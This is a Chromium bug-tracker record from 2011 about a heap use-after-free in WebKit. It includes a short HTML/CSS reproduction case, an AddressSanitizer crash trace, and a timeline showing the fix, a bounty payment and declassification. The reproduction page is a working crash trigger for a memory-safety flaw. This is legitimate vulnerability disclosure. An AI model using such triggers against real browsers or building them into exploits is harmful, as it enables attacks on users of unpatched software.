# Use after free with :after in display table and :first-letter

| Field | Value |
|-------|-------|
| **Issue ID** | [40095966](https://issues.chromium.org/issues/40095966) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-10-06 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

missing font, :after, :first-letter, <p>

**VERSION**  

Chrome Version:  

Chromium 16.0.901.0 (Developer Build 103965)  

OS Linux  

WebKit 535.6 (trunk@96574)  

JavaScript V8 3.6.4.1

Operating System: linux 64bit

**REPRODUCTION CASE**

<html>
<head>
<style>
@font-face { font-family: "A"; src: url(); }
p { font-family: A; }
p:after {
display: table;
content: "BB";
}
p:first-letter{ height: 0; }
</style>
</head>
<body>
<p></p>
</body>
</html>
<script>
document.designMode='on'
document.execCommand('selectall')
</script>
<style>
</style>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==8124== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffe38ad890 at pc 0x7ffff1fb4961 bp 0x7fffffff38c0 sp 0x7fffffff3890  

READ of size 4 at 0x7fffe38ad890 thread T0  

#0 0x7ffff1fb4961 in WebCore::FontMetrics::ascent(WebCore::FontBaseline) const ???:0  

#1 0x7ffff1fb480b in WebCore::FontMetrics::height(WebCore::FontBaseline) const ???:0  

#2 0x7ffff3582cae in WebCore::InlineBox::logicalFrameRect() const ???:0

0x7fffe38ad890 is located 16 bytes inside of 1208-byte region [0x7fffe38ad880,0x7fffe38add38)  

freed by thread T0 here:  

#0 0x7ffff5dfe9ca in free *asan\_rtl*  

#1 0x7ffff3523f2d in WebCore::CSSFontFaceSource::pruneTable() ???:0  

#2 0x7ffff3524171 in WebCore::CSSFontFaceSource::fontLoaded(WebCore::CachedFont\*) ???:0  

#3 0x7ffff346852d in WebCore::CachedFont::checkNotify() ???:0

## Attachments

- [after-first-letter.html](attachments/after-first-letter.html) (text/html; charset=us-ascii, 374 B)
- [after-first-letter.txt](attachments/after-first-letter.txt) (text/x-c; charset=us-ascii, 12.2 KB)

## Timeline

### in...@chromium.org (2011-10-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-10-06)

Upstreamed - https://bugs.webkit.org/show_bug.cgi?id=69540

### in...@chromium.org (2011-10-06)

very nice catch..

### in...@chromium.org (2011-10-11)

http://trac.webkit.org/changeset/97124

merged to m15 in r97125.

### sc...@gmail.com (2011-10-19)

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-10-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-28)

Payment in system, can take up to a couple of weeks.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/99294?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095966)*
